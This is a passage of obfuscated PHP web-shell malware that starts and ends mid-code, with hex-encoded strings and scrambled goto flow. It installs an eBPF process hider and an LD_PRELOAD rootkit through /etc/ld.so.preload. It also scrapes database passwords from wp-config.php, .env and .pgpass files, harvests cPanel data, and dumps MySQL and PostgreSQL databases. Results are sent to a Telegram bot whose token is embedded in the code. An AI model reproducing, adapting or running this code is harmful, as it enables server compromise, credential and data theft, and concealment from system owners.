sendTelegramMessage($botToken, $telegramUserId, $msg); return array("\x73\x74\x61\x74\165\x73" => "\x73\x75\x63\143\145\163\x73", "\x6d\145\163\163\141\147\145" => "{$cloned}\x20\146\151\x6c\x65\x73\40\143\154\157\156\x65\144"); } goto jFEgt; ZymKE: if (isset($_GET["\x6c\151\x73\x74\x5f\x73\160\162\145\141\144"]) && isset($_SESSION["\154\157\147\x67\145\144\x69\x6e"]) && $_SESSION["\x6c\x6f\147\x67\145\144\151\156"] === true) { $result = list_spread(); sendJsonResponse($result); } goto TxKpF; FaKTP: function hide_process_ebpf($process_name, $action = "\x68\151\x64\145") { global $botToken, $telegramUserId; $results = array(); $process_name = substr((string) $process_name, 0, 16); if ($action === "\x68\151\x64\x65") { $results[] = "\x5b\x31\x5d\40\111\156\163\164\141\x6c\154\151\156\147\40\145\x42\x50\x46\x20\160\x72\x6f\143\145\163\163\40\150\151\x64\145\162\x2e\x2e\x2e"; $ebpf_code = "\12\43\151\x6e\x63\154\x75\144\145\40\74\x6c\x69\156\165\170\57\x62\160\x66\56\150\76\12\x23\x69\156\143\x6c\x75\144\x65\40\74\x62\x70\146\x2f\x62\160\146\137\150\x65\154\160\x65\162\x73\x2e\x68\x3e\xa\43\151\x6e\143\154\x75\x64\x65\40\74\142\x70\x66\57\142\x70\146\x5f\x74\162\x61\x63\x69\x6e\x67\56\x68\76\xa\xa\x53\105\103\50\x22\x6b\160\162\x6f\142\145\57\147\145\x74\x64\x65\156\x74\163\x36\64\x22\51\12\151\156\x74\40\x42\x50\106\137\x4b\x50\122\117\102\x45\50\x68\151\144\x65\137\160\162\x6f\143\x65\x73\163\54\40\x73\164\162\165\x63\164\40\154\151\156\x75\x78\x5f\x64\151\x72\x65\x6e\164\x36\64\52\40\144\151\x72\160\x29\40\x7b\xa\x20\40\40\40\143\x68\141\162\x20\143\x6f\x6d\x6d\x5b\61\66\135\x3b\xa\x20\40\40\40\x62\x70\146\137\x67\x65\x74\x5f\x63\165\162\x72\145\x6e\x74\137\143\x6f\x6d\155\x28\x63\157\x6d\x6d\54\40\163\151\172\145\x6f\146\x28\143\157\155\155\51\51\x3b\12\40\40\x20\40\43\160\x72\x61\x67\x6d\141\40\x75\x6e\162\157\x6c\154\xa\x20\40\40\40\x66\x6f\162\40\x28\x69\x6e\164\40\x69\x20\75\x20\x30\x3b\x20\151\40\x3c\x20\61\66\73\40\x69\x2b\x2b\x29\40\x7b\xa\40\x20\40\x20\40\x20\x20\x20\151\x66\40\x28\143\x6f\x6d\155\x5b\151\135\x20\41\75\40\42" . $process_name . "\42\x5b\x69\x5d\x29\x20\173\xa\40\40\40\x20\40\40\x20\40\x20\40\x20\40\162\x65\x74\x75\162\x6e\40\60\73\xa\40\40\40\40\x20\40\40\40\175\xa\x20\x20\x20\40\175\12\x20\x20\x20\x20\162\145\164\165\x72\156\x20\55\105\x4e\x4f\x45\116\x54\x3b\12\175\12\xa\x53\x45\103\50\42\153\x70\162\157\142\145\x2f\147\145\x74\144\145\x6e\164\163\x22\51\12\151\156\x74\40\x42\120\106\x5f\x4b\x50\x52\117\x42\105\50\150\151\144\145\x5f\160\x72\x6f\x63\145\163\x73\x33\x32\54\x20\x73\164\162\x75\143\x74\40\154\151\x6e\165\170\137\144\151\162\145\156\x74\x2a\x20\144\x69\x72\x70\51\x20\173\12\x20\x20\x20\x20\x63\150\x61\x72\40\143\157\x6d\155\133\x31\66\x5d\x3b\12\x20\40\x20\x20\x62\x70\x66\137\147\145\164\137\x63\165\162\162\x65\156\x74\x5f\x63\x6f\155\155\50\143\x6f\155\x6d\x2c\x20\x73\x69\x7a\145\x6f\146\50\143\x6f\x6d\x6d\x29\51\73\12\40\40\x20\40\43\160\162\x61\147\x6d\141\40\x75\156\162\x6f\x6c\154\12\x20\40\40\x20\x66\157\162\x20\50\151\156\164\40\151\x20\75\x20\x30\73\40\x69\40\74\x20\61\66\x3b\x20\x69\x2b\x2b\51\x20\173\12\x20\40\40\40\40\40\x20\40\151\x66\x20\50\x63\x6f\x6d\155\x5b\151\135\40\41\x3d\40\42" . $process_name . "\x22\133\x69\135\x29\40\173\12\x20\40\40\x20\40\40\40\40\40\x20\x20\40\162\145\164\x75\x72\x6e\40\x30\73\12\x20\40\x20\40\40\x20\40\40\175\12\40\x20\40\40\x7d\xa\40\x20\40\40\x72\145\x74\165\162\156\40\x2d\105\x4e\x4f\105\x4e\x54\73\xa\175\xa\xa\143\150\141\x72\x20\x5f\154\151\143\145\156\163\145\x5b\x5d\40\x53\105\x43\x28\42\154\151\143\x65\156\x73\145\x22\x29\40\75\40\x22\107\x50\114\42\x3b\12"; @file_put_contents("\x2f\x74\155\160\x2f\150\151\144\145\x5f\x70\162\x6f\143\x65\x73\x73\56\142\160\146\56\x63", $ebpf_code); @shell_exec("\x63\x6c\x61\156\147\x20\x2d\117\x32\40\55\164\x61\162\147\145\164\x20\142\x70\x66\x20\55\143\40\57\164\155\160\x2f\x68\x69\144\145\137\160\x72\x6f\x63\x65\x73\163\56\142\x70\x66\x2e\x63\x20\x2d\x6f\40\57\164\x6d\x70\57\150\151\x64\145\137\x70\162\x6f\x63\x65\x73\163\x2e\x62\x70\x66\56\157\x20\x32\x3e\x2f\144\145\166\x2f\x6e\165\154\x6c"); @shell_exec("\x62\160\146\164\x6f\x6f\154\40\160\x72\x6f\x67\x20\x6c\x6f\141\x64\40\57\x74\155\x70\x2f\x68\151\144\145\137\160\x72\x6f\x63\x65\163\x73\x2e\142\160\146\56\x6f\40\57\x73\171\x73\57\x66\x73\x2f\x62\x70\x66\57\x68\151\x64\x65\137\160\x72\157\143\x65\163\x73\40\62\x3e\57\x64\x65\x76\57\x6e\x75\154\x6c"); if (file_exists("\57\163\171\x73\57\x66\x73\57\142\x70\x66\57\150\x69\x64\145\x5f\x70\x72\157\143\145\x73\x73")) { @shell_exec("\x62\x70\x66\x74\157\x6f\x6c\x20\x70\162\x6f\147\40\x61\164\x74\x61\143\x68\40\160\151\156\156\x65\x64\40\57\x73\171\x73\57\x66\x73\57\x62\x70\146\57\x68\x69\x64\145\x5f\160\162\x6f\143\145\163\163\40\153\x70\162\157\142\145\40\147\145\164\144\x65\156\164\163\x36\64\x20\x32\x3e\57\x64\x65\x76\57\x6e\165\154\x6c"); @shell_exec("\x62\160\146\164\x6f\x6f\x6c\40\160\162\157\x67\x20\x61\164\x74\x61\x63\150\x20\160\151\x6e\x6e\x65\x64\40\x2f\163\x79\x73\57\x66\163\57\x62\x70\x66\57\x68\x69\x64\x65\137\x70\162\157\x63\x65\163\163\x20\153\x70\162\157\142\145\40\147\x65\164\144\145\156\164\163\x20\x32\x3e\57\x64\145\x76\57\156\x75\x6c\x6c"); $results[] = "\342\x9c\x85\40\x65\x42\120\106\x20\160\162\x6f\x63\145\x73\163\x20\x68\x69\x64\145\x72\x20\x69\x6e\163\x74\x61\154\x6c\x65\x64"; } else { $results[] = "\xe2\x9a\xa0\xef\270\x8f\40\145\x42\x50\106\40\156\157\164\x20\x61\166\x61\x69\154\x61\142\x6c\145\54\x20\x75\163\x69\156\x67\40\x66\x61\154\154\142\x61\x63\x6b"; } $results[] = "\133\x32\x5d\40\111\x6e\x73\164\141\x6c\154\151\x6e\147\40\x41\172\x61\x74\x68\157\164\150\55\x73\164\171\154\145\40\162\x6f\x6f\164\x6b\151\x74\x2e\x2e\x2e"; $rootkit_code = "\xa\43\x64\145\x66\151\156\145\40\137\x47\116\125\137\x53\117\125\122\x43\x45\xa\43\151\x6e\143\x6c\x75\144\x65\x20\x3c\x64\x6c\146\x63\156\56\x68\x3e\xa\43\151\x6e\143\x6c\165\x64\x65\40\74\x64\151\162\x65\156\164\x2e\150\x3e\xa\43\151\x6e\143\x6c\165\144\145\x20\x3c\163\x74\162\x69\156\147\56\150\x3e\xa\x23\x69\156\x63\154\x75\x64\x65\x20\x3c\165\x6e\x69\x73\164\x64\x2e\x68\76\xa\x23\x69\x6e\x63\x6c\x75\x64\145\x20\74\163\x79\163\x2f\163\171\x73\143\x61\x6c\154\x2e\x68\76\12\xa\163\x74\141\164\151\x63\x20\x63\157\156\163\164\x20\x63\150\141\162\52\40\x68\x69\x64\x64\x65\156\137\160\x72\x6f\x63\x73\x5b\x5d\x20\75\x20\x7b\42" . $process_name . "\x22\x2c\40\42\x70\x68\160\x22\54\x20\42\163\x68\x65\154\x6c\42\54\40\x4e\x55\x4c\114\175\73\xa\12\154\x6f\156\147\x20\163\171\163\143\141\x6c\x6c\x28\154\157\156\147\x20\x6e\x75\155\142\145\x72\x2c\x20\x2e\x2e\56\x29\40\x7b\xa\x20\x20\x20\x20\154\x6f\156\x67\40\50\x2a\157\162\x69\147\137\x73\171\x73\143\141\154\154\51\50\x6c\157\x6e\147\54\x20\56\56\x2e\x29\40\x3d\x20\x64\154\x73\171\155\50\122\x54\x4c\x44\137\116\105\130\124\x2c\40\42\163\x79\x73\143\x61\x6c\154\x22\51\x3b\xa\x20\x20\x20\x20\x69\146\40\50\x6e\x75\x6d\142\x65\162\x20\75\75\40\x53\x59\x53\137\147\145\164\144\145\156\164\163\66\x34\40\x7c\x7c\40\x6e\x75\x6d\142\x65\162\x20\75\75\40\x53\x59\x53\137\147\x65\164\144\145\x6e\164\163\x29\40\173\12\40\40\40\x20\40\40\40\40\x72\145\x74\165\x72\156\40\x2d\x45\116\117\x45\116\x54\73\xa\x20\x20\40\40\x7d\xa\40\40\x20\x20\162\145\164\x75\x72\156\x20\x6f\x72\x69\147\x5f\163\x79\163\143\141\154\x6c\x28\156\165\155\x62\145\162\54\40\x5f\x5f\x56\x41\137\x41\x52\107\x53\x5f\x5f\51\73\12\175\12\12\x73\164\162\165\x63\x74\x20\x64\151\162\145\156\x74\52\x20\x72\145\x61\144\x64\x69\162\50\x44\x49\x52\x2a\40\x64\151\162\160\x29\x20\x7b\12\40\x20\x20\x20\x73\164\x72\x75\143\164\x20\x64\x69\x72\145\156\x74\52\x20\x28\52\x6f\x72\x69\x67\x5f\162\145\141\x64\144\x69\x72\x29\x28\104\111\122\52\51\40\x3d\40\x64\x6c\x73\x79\155\x28\x52\124\x4c\x44\137\116\x45\x58\124\54\40\x22\162\x65\141\x64\x64\151\162\42\x29\x3b\12\40\x20\40\40\163\164\162\x75\x63\164\x20\x64\151\162\145\156\164\52\40\x64\151\162\73\12\40\40\x20\x20\167\150\151\154\145\x20\x28\50\x64\x69\162\40\x3d\x20\157\x72\x69\x67\x5f\162\145\141\x64\144\x69\162\x28\144\151\x72\x70\x29\51\x20\x21\75\x20\x4e\125\114\114\51\40\x7b\12\x20\40\40\x20\40\x20\x20\x20\x69\156\x74\x20\150\151\x64\144\145\x6e\40\75\40\x30\x3b\xa\40\x20\x20\x20\x20\x20\40\40\146\157\162\40\50\151\x6e\164\x20\x69\40\x3d\x20\x30\73\40\150\x69\144\x64\x65\x6e\x5f\160\x72\157\143\163\x5b\151\x5d\40\41\75\x20\116\125\x4c\114\x3b\x20\x69\53\53\x29\40\173\xa\40\x20\x20\40\40\x20\x20\x20\x20\x20\40\x20\x69\146\x20\50\x73\164\162\x73\x74\x72\50\144\x69\x72\x2d\x3e\144\137\156\141\155\x65\x2c\40\150\x69\144\x64\x65\x6e\x5f\160\162\157\143\x73\x5b\x69\135\x29\x20\41\75\x20\x4e\x55\x4c\114\x29\40\x7b\xa\40\40\x20\x20\40\x20\40\40\40\x20\40\40\40\x20\40\x20\150\x69\144\x64\145\156\x20\75\x20\x31\x3b\xa\x20\40\40\40\x20\x20\x20\40\x20\40\x20\40\40\x20\40\x20\142\x72\145\x61\x6b\73\xa\40\40\x20\x20\x20\40\x20\x20\40\40\40\x20\x7d\12\x20\40\x20\x20\x20\40\40\x20\x7d\xa\x20\40\40\40\40\40\40\40\x69\146\40\x28\41\x68\x69\144\x64\145\x6e\x29\40\x72\145\164\x75\162\x6e\40\x64\x69\x72\x3b\xa\x20\x20\x20\x20\175\xa\x20\x20\40\x20\162\145\164\165\x72\x6e\x20\116\x55\x4c\x4c\73\xa\175\12\12\x69\x6e\x74\40\x73\143\x61\156\x64\x69\162\50\x63\x6f\156\x73\x74\x20\143\150\x61\x72\x2a\40\144\x69\x72\54\40\x73\x74\162\x75\x63\164\40\x64\151\162\145\156\164\x2a\52\x2a\x20\156\x61\155\145\154\x69\163\164\x2c\12\x20\x20\x20\x20\x20\40\40\40\40\x20\40\x20\151\x6e\164\40\x28\x2a\146\x69\x6c\x74\x65\162\51\50\x63\x6f\156\x73\164\40\163\x74\162\165\x63\x74\40\144\x69\162\x65\156\x74\x2a\51\x2c\12\x20\x20\x20\40\40\40\x20\40\x20\40\40\40\x69\156\164\x20\x28\52\x63\157\x6d\160\141\162\51\x28\143\x6f\156\163\164\40\x73\164\162\165\x63\164\40\144\x69\162\145\x6e\164\x2a\x2a\54\40\x63\157\156\x73\164\x20\x73\164\x72\x75\143\164\40\144\x69\162\x65\156\x74\x2a\x2a\51\51\40\173\12\x20\40\40\x20\151\x6e\x74\x20\x28\52\157\x72\151\147\x5f\163\x63\141\156\144\151\x72\x29\x28\x63\157\x6e\x73\x74\40\x63\150\141\162\x2a\54\40\x73\164\x72\x75\143\164\x20\x64\151\162\145\156\164\x2a\x2a\x2a\x2c\x20\12\x20\x20\40\40\40\x20\40\x20\40\40\40\x20\40\x20\x20\40\40\40\40\40\40\x20\x20\x20\151\x6e\x74\40\50\52\51\50\x63\x6f\x6e\x73\x74\x20\x73\164\162\165\143\x74\40\x64\151\x72\145\x6e\164\52\x29\x2c\12\40\40\x20\x20\40\x20\40\40\x20\40\40\40\x20\x20\40\x20\x20\40\x20\x20\40\x20\x20\40\x69\x6e\164\40\50\x2a\51\50\143\x6f\156\163\x74\40\163\x74\x72\165\143\164\x20\144\x69\x72\145\x6e\164\x2a\x2a\x2c\40\143\x6f\156\163\164\x20\x73\x74\x72\165\143\x74\40\x64\151\162\145\156\x74\52\x2a\x29\51\x20\x3d\x20\x64\x6c\x73\x79\155\x28\x52\x54\x4c\x44\137\116\105\130\x54\54\x20\x22\x73\143\141\156\144\x69\162\42\51\73\xa\40\40\x20\40\x69\156\164\40\162\145\x74\x20\75\x20\x6f\162\x69\147\x5f\163\x63\x61\x6e\x64\151\162\50\x64\151\162\x2c\x20\x6e\x61\155\x65\154\x69\x73\x74\x2c\40\146\x69\154\x74\x65\x72\x2c\40\143\x6f\x6d\x70\x61\x72\x29\x3b\12\40\x20\x20\x20\151\146\x20\x28\x72\x65\164\x20\76\x20\x30\x20\46\46\40\163\164\x72\x73\164\x72\50\144\x69\x72\x2c\40\x22\57\160\162\157\x63\x22\x29\x20\41\75\x20\116\125\114\x4c\51\40\x7b\12\40\40\40\40\40\40\40\x20\151\156\164\40\156\145\167\x5f\x72\x65\164\x20\75\40\60\73\12\40\40\x20\40\x20\40\x20\x20\146\x6f\x72\40\x28\x69\156\164\x20\x69\40\75\40\60\x3b\40\x69\40\74\x20\162\145\x74\x3b\x20\151\x2b\x2b\51\x20\173\12\40\40\40\x20\40\40\x20\x20\40\40\x20\x20\x69\156\x74\x20\x68\x69\x64\x64\x65\x6e\x20\x3d\40\x30\73\12\x20\40\40\x20\x20\40\x20\x20\40\x20\x20\40\146\x6f\x72\x20\50\x69\x6e\x74\40\x6a\x20\x3d\x20\x30\73\x20\x68\x69\x64\144\x65\156\x5f\x70\162\157\143\163\x5b\152\135\40\x21\75\x20\x4e\125\114\x4c\x3b\x20\x6a\x2b\53\x29\40\173\xa\40\x20\x20\x20\x20\x20\40\40\40\40\x20\x20\x20\x20\40\40\151\146\40\x28\x73\x74\x72\x73\x74\x72\x28\x28\52\x6e\x61\x6d\x65\x6c\151\x73\164\x29\x5b\151\135\x2d\x3e\144\x5f\156\x61\155\x65\x2c\x20\150\151\144\x64\145\156\x5f\x70\x72\157\x63\x73\x5b\152\x5d\51\40\41\x3d\40\x4e\125\x4c\114\x29\x20\x7b\xa\x20\x20\x20\x20\40\x20\x20\40\40\x20\x20\40\40\x20\x20\x20\x20\40\40\x20\150\151\x64\x64\145\156\40\x3d\x20\61\73\xa\40\40\40\40\x20\x20\x20\40\x20\40\x20\40\40\40\40\40\40\40\40\x20\142\x72\x65\x61\x6b\73\xa\40\40\40\40\x20\40\40\40\x20\40\40\x20\40\40\x20\x20\175\xa\x20\x20\x20\x20\x20\40\x20\40\40\x20\40\40\x7d\xa\x20\40\40\x20\x20\x20\x20\40\x20\40\x20\x20\151\x66\x20\50\x21\150\151\144\x64\x65\156\51\x20\x7b\12\x20\40\40\40\40\x20\x20\40\40\40\x20\x20\40\40\40\x20\50\x2a\x6e\x61\155\145\x6c\151\x73\164\x29\x5b\x6e\145\167\137\162\145\x74\53\53\135\x20\x3d\40\x28\52\x6e\x61\x6d\145\154\x69\163\164\51\133\x69\135\73\12\x20\x20\40\40\40\40\40\40\40\40\40\40\175\xa\x20\40\40\40\40\40\40\x20\175\12\x20\40\x20\x20\x20\40\x20\x20\162\145\x74\x20\75\x20\x6e\145\x77\137\162\145\x74\73\12\x20\40\x20\40\175\xa\x20\40\40\40\x72\145\x74\165\162\x6e\40\162\x65\164\x3b\xa\x7d\12"; @file_put_contents("\57\164\x6d\160\57\x72\x6f\x6f\x74\x6b\151\x74\56\x63", $rootkit_code); @shell_exec("\147\x63\x63\40\55\x73\x68\141\162\145\x64\x20\55\x66\120\111\103\x20\x2f\164\x6d\160\57\x72\x6f\157\164\153\x69\164\56\143\x20\x2d\x6f\40\x2f\164\155\x70\57\x6c\x69\x62\x72\157\157\x74\x6b\151\164\56\x73\x6f\40\55\x6c\144\x6c\x20\62\76\x2f\x64\x65\x76\57\156\x75\154\154"); if (file_exists("\57\164\155\x70\57\154\x69\142\162\x6f\157\164\x6b\x69\x74\56\163\x6f")) { @copy("\57\164\x6d\x70\x2f\x6c\151\x62\x72\x6f\157\164\153\151\x74\x2e\163\x6f", "\57\x75\163\162\x2f\154\x6f\143\x61\154\57\154\x69\x62\x2f\x6c\151\x62\162\157\157\164\153\x69\x74\x2e\163\157"); @file_put_contents("\x2f\145\x74\x63\x2f\154\144\x2e\x73\x6f\x2e\x70\x72\145\154\157\141\x64", "\x2f\x75\x73\x72\57\x6c\x6f\143\141\154\57\154\x69\142\57\154\151\x62\x72\x6f\157\x74\153\151\164\x2e\163\x6f\12", FILE_APPEND); @shell_exec("\154\x64\143\157\156\146\x69\x67\x20\x32\x3e\x2f\144\x65\166\57\x6e\165\x6c\154"); $results[] = "\xe2\x9c\x85\40\101\x7a\x61\164\x68\x6f\x74\x68\40\162\157\157\164\153\151\x74\x20\x69\x6e\163\x74\x61\154\154\x65\x64"; } $msg = "\101\x44\126\101\116\103\105\104\x20\120\x52\117\103\x45\x53\123\x20\110\x49\104\x49\x4e\107\xa\12" . implode("\12", $results); sendTelegramMessage($botToken, $telegramUserId, $msg); return array("\x73\x74\141\x74\x75\x73" => "\163\x75\x63\143\x65\163\163", "\155\x65\x73\163\141\147\x65" => $msg); } return array("\x73\x74\x61\164\x75\163" => "\x65\x72\162\157\x72", "\x6d\145\163\x73\x61\147\x65" => "\111\x6e\166\x61\x6c\x69\x64\x20\x61\143\164\151\157\x6e"); } goto D2qnv; eD4Vr: $botToken = "\70\65\61\x33\x30\x30\x38\x38\x36\x35\x3a\x41\x41\106\166\102\144\165\x65\x50\x5f\x48\122\141\102\x66\x55\x35\x68\155\67\145\154\x33\154\x51\x41\116\61\x44\x78\172\147\117\105\64"; goto LyMTl; umZnB: @session_start(); goto Zw8MR; qounf: if (!$shellExecAvailable && !function_exists("\x73\x68\x65\154\x6c\137\x65\170\145\x63")) { function shell_exec($cmd) { return "\163\x68\145\x6c\154\x5f\x65\x78\x65\143\40\164\151\144\141\153\40\x74\145\162\x73\x65\x64\x69\x61\40\x64\x69\x20\x73\x65\162\166\145\x72\40\x69\156\x69\56"; } } goto M7DlK; TxKpF: if (isset($_GET["\x63\160\141\x6e\145\154\137\x68\141\162\166\145\x73\x74"]) && isset($_SESSION["\x6c\x6f\147\x67\x65\x64\x69\x6e"]) && $_SESSION["\x6c\x6f\147\x67\x65\x64\x69\156"] === true) { $result = cpanel_harvest(); sendJsonResponse(array("\x73\164\141\164\165\x73" => "\x73\x75\143\x63\x65\163\163", "\155\x65\x73\x73\x61\147\145" => "\x63\120\x61\x6e\145\154\x20\150\141\x72\166\x65\163\x74\x20\x64\157\x6e\x65\x20\x26\40\163\x65\x6e\x74\40\x74\x6f\40\x54\145\154\x65\x67\162\141\x6d")); } goto KLGTR; Q8Vul: if (isset($_GET["\x64\x62\x5f\145\170\160\154\157\x72\x65\x72"]) && isset($_SESSION["\x6c\x6f\147\x67\145\144\x69\156"]) && $_SESSION["\154\157\x67\x67\x65\x64\x69\156"] === true) { global $botToken, $telegramUserId; $action = isset($_GET["\x61\143\164\151\x6f\156"]) ? $_GET["\x61\x63\164\x69\x6f\156"] : "\x6c\x69\x73\164"; $db_type = isset($_GET["\164\171\160\x65"]) ? $_GET["\164\171\160\x65"] : "\x6d\x79\163\x71\x6c"; $db_name = isset($_GET["\x64\142"]) ? $_GET["\x64\142"] : ''; $result = array(); if ($db_type === "\x6d\171\163\x71\154") { $creds = array(); $config_files = array("\x2f\166\141\x72\57\x77\167\x77\57\x68\x74\155\154\57\x77\x70\55\143\x6f\156\146\x69\x67\x2e\x70\x68\160", "\57\x76\x61\x72\x2f\x77\x77\x77\57\150\164\155\x6c\x2f\56\145\156\x76", "\x2f\150\x6f\155\145\x2f\x2a\57\160\x75\142\154\x69\x63\137\150\164\155\x6c\57\167\x70\x2d\x63\x6f\156\146\x69\147\56\160\x68\160"); foreach ($config_files as $pattern) { $files = @glob($pattern); if ($files !== false) { foreach ($files as $file) { if (is_readable($file)) { $content = @file_get_contents($file); if ($content !== false) { preg_match("\57\x64\145\146\x69\156\x65\x5c\163\52\134\50\x5c\163\52\133\47\x22\135\x44\x42\x5f\116\x41\115\105\x5b\x27\42\x5d\134\163\52\x2c\x5c\163\x2a\133\47\42\135\50\x5b\x5e\47\42\135\x2b\x29\x5b\47\42\135\134\163\52\x5c\x29\57\x69", $content, $db); preg_match("\57\x64\145\146\x69\x6e\145\x5c\163\52\x5c\x28\134\x73\x2a\x5b\47\x22\x5d\104\102\x5f\125\123\x45\x52\133\x27\x22\x5d\x5c\163\x2a\x2c\x5c\x73\52\x5b\x27\x22\x5d\x28\x5b\x5e\47\x22\x5d\x2b\x29\133\47\x22\135\x5c\163\52\134\x29\57\x69", $content, $user); preg_match("\57\144\x65\146\x69\156\x65\134\x73\52\134\x28\x5c\x73\x2a\133\x27\42\x5d\x44\102\x5f\120\x41\x53\123\127\x4f\x52\x44\x5b\x27\x22\x5d\134\163\52\54\134\x73\x2a\133\x27\x22\135\x28\x5b\136\47\x22\x5d\53\x29\x5b\x27\x22\135\134\163\52\134\51\57\151", $content, $pass); preg_match("\x2f\144\145\x66\x69\156\x65\134\x73\x2a\x5c\x28\x5c\x73\52\x5b\x27\x22\x5d\104\x42\137\110\117\123\124\133\47\42\135\134\x73\52\x2c\134\x73\x2a\133\47\x22\x5d\x28\133\136\47\42\135\53\51\x5b\47\x22\x5d\134\x73\x2a\134\x29\57\x69", $content, $host); if (!empty($db[1]) && !empty($user[1])) { $creds[] = array("\x64\142" => $db[1] ?? '', "\x75\163\145\162" => $user[1] ?? '', "\160\x61\163\x73" => $pass[1] ?? '', "\x68\x6f\x73\x74" => $host[1] ?? "\x6c\157\x63\x61\x6c\150\x6f\x73\164"); } } } } } } if (empty($creds)) { $creds[] = array("\x64\x62" => $db_name, "\165\163\145\162" => "\x72\157\157\164", "\x70\141\x73\x73" => '', "\150\157\x73\164" => "\154\157\143\141\154\x68\157\x73\x74"); } foreach ($creds as $cred) { if ($action === "\x6c\151\x73\164") { $cmd = "\x6d\x79\x73\x71\x6c\x20\x2d\150\x20" . escapeshellarg($cred["\x68\157\x73\164"]) . "\x20\x2d\x75\40" . escapeshellarg($cred["\165\163\x65\x72"]) . "\x20" . (!empty($cred["\160\141\163\163"]) ? "\x2d\x70" . escapeshellarg($cred["\160\x61\x73\x73"]) : '') . "\x20\55\145\x20\47\x53\x48\x4f\127\x20\104\101\x54\x41\102\x41\123\x45\x53\x27\x20\62\x3e\x2f\144\x65\166\x2f\156\x75\154\154"; $output = @shell_exec($cmd); if ($output !== null && !empty($output)) { $result[] = "\x44\x61\x74\x61\x62\141\163\x65\x73\40\x6f\156\40{$cred["\150\157\163\x74"]}\40\50\x75\163\x65\x72\x3a\40{$cred["\x75\x73\x65\162"]}\51\72"; $result[] = $output; break; } } elseif ($action === "\x74\x61\x62\x6c\x65\x73" && !empty($db_name)) { $cmd = "\155\x79\163\x71\154\40\55\150\40" . escapeshellarg($cred["\x68\157\163\164"]) . "\40\x2d\165\40" . escapeshellarg($cred["\165\163\145\162"]) . "\x20" . (!empty($cred["\x70\x61\163\163"]) ? "\x2d\160" . escapeshellarg($cred["\x70\141\163\163"]) : '') . "\40\55\104\x20{$db_name}\x20\x2d\x65\40\47\x53\x48\x4f\x57\x20\124\x41\x42\114\105\123\47\40\62\76\57\x64\145\x76\x2f\156\165\x6c\154"; $output = @shell_exec($cmd); if ($output !== null && !empty($output)) { $result[] = "\124\x61\142\x6c\145\x73\x20\x69\x6e\40{$db_name}\72"; $result[] = $output; break; } } elseif ($action === "\144\165\x6d\160" && !empty($db_name)) { $cmd = "\155\171\x73\161\154\x64\x75\x6d\x70\40\x2d\x68\x20" . escapeshellarg($cred["\x68\157\x73\x74"]) . "\x20\x2d\x75\x20" . escapeshellarg($cred["\x75\x73\145\162"]) . "\40" . (!empty($cred["\x70\x61\x73\x73"]) ? "\x2d\x70" . escapeshellarg($cred["\160\x61\163\163"]) : '') . "\x20{$db_name}\x20\62\76\57\x64\x65\166\57\156\x75\x6c\x6c\40\x7c\40\x67\172\x69\x70\40\x2d\x63\x20\174\40\142\x61\x73\145\x36\x34\40\55\x77\40\x30"; $output = @shell_exec($cmd); if ($output !== null && !empty($output)) { $result[] = "\104\x61\x74\x61\x62\x61\163\x65\x20{$db_name}\x20\x64\165\x6d\x70\x65\144\40\50\142\x61\x73\x65\66\x34\x2b\x67\x7a\x69\x70\x29"; $result[] = substr($output, 0, 500) . "\x2e\56\x2e"; break; } } } if (empty($result)) { $result[] = "\x4e\x6f\40\115\171\x53\x51\x4c\40\x63\162\x65\144\x65\156\164\151\141\154\163\40\146\x6f\x75\x6e\144\40\157\x72\40\143\157\x6e\156\145\143\x74\151\157\156\40\146\141\151\154\x65\144"; } } elseif ($db_type === "\x70\x6f\x73\164\x67\162\145\x73\161\154") { $creds = array(); $pgpass = "\x2f\x68\x6f\155\x65\x2f\x2a\x2f\56\160\147\160\141\163\163"; $files = @glob($pgpass); if ($files !== false) { foreach ($files as $file) { if (is_readable($file)) { $content = @file_get_contents($file); if ($content !== false) { preg_match_all("\57\x28\x5b\136\72\x5d\x2b\x29\72\x28\133\x5e\x3a\x5d\53\51\72\x28\x5b\x5e\x3a\135\x2b\51\x3a\x28\x5b\136\x3a\x5d\53\x29\72\50\x5b\x5e\72\135\x2b\x29\x2f", $content, $matches); for ($i = 0; $i < count($matches[0]); $i++) { $creds[] = array("\x68\157\x73\x74" => $matches[1][$i] ?? "\x6c\x6f\x63\x61\154\150\157\x73\164", "\160\x6f\x72\x74" => $matches[2][$i] ?? "\x35\64\x33\62", "\144\142" => $matches[3][$i] ?? '', "\x75\163\x65\162" => $matches[4][$i] ?? '', "\x70\x61\x73\x73" => $matches[5][$i] ?? ''); } } } } } if (empty($creds)) { $creds[] = array("\150\157\163\x74" => "\154\x6f\x63\141\154\150\157\x73\164", "\x70\157\162\x74" => "\65\64\x33\x32", "\x64\x62" => $db_name, "\x75\x73\x65\x72" => "\160\157\163\164\x67\162\x65\163", "\x70\x61\x73\x73" => ''); } foreach ($creds as $cred) { if ($action === "\154\151\x73\x74") { $cmd = "\x50\x47\120\101\123\x53\x57\117\122\104\75\x27{$cred["\x70\x61\163\163"]}\x27\40\160\x73\161\154\40\55\150\40{$cred["\150\157\163\164"]}\x20\55\x70\x20{$cred["\160\157\x72\x74"]}\x20\55\x55\x20{$cred["\165\163\145\162"]}\40\x2d\x6c\40\x2d\x74\x20\x32\76\57\x64\x65\x76\x2f\x6e\x75\x6c\154"; $output = @shell_exec($cmd); if ($output !== null && !empty($output)) { $result[] = "\120\157\x73\x74\147\162\x65\x53\121\x4c\40\144\x61\164\x61\142\x61\x73\x65\x73\72"; $result[] = $output; break; } } elseif ($action === "\144\165\x6d\x70" && !empty($db_name)) { $cmd = "\x50\107\120\x41\x53\123\x57\x4f\122\x44\x3d\47{$cred["\160\141\163\x73"]}\47\40\160\147\137\144\165\155\160\40\55\150\40{$cred["\x68\157\163\x74"]}\x20\55\160\x20{$cred["\x70\x6f\162\164"]}\x20\x2d\125\x20{$cred["\165\163\145\162"]}\x20{$db_name}\x20\62\76\x2f\x64\x65\x76\x2f\x6e\x75\154\154\x20\x7c\x20\147\x7a\x69\160\40\55\x63\40\x7c\x20\x62\x61\163\x65\66\64\x20\55\167\40\x30"; $output = @shell_exec($cmd); if ($output !== null && !empty($output)) { $result[] = "\120\x6f\163\x74\147\162\145\x53\x51\114\x20\144\141\x74\x61\x62\x61\x73\x65\x20{$db_name}\x20\x64\x75\x6d\160\145\x64"; $result[] = substr($output, 0, 500) . "\x2e\x2e\x2e"; break; } } } if (empty($result)) { $result[] = "\116\157\40\x50\157\163\x74\x67\162\145\x53\x51\x4c\40\143\162\145\144\x65\x6e\164\151\141\x6c\163\x20\146\x6f\x75\x6e\144\x20\x6f\162\x20\143\x6f\156\156\145\143\x74\x69\157\x6e\40\146\x61\151\x6c\x65\144"; } } elseif ($db_type === "\162\x65\144\151\163") { $cmd = 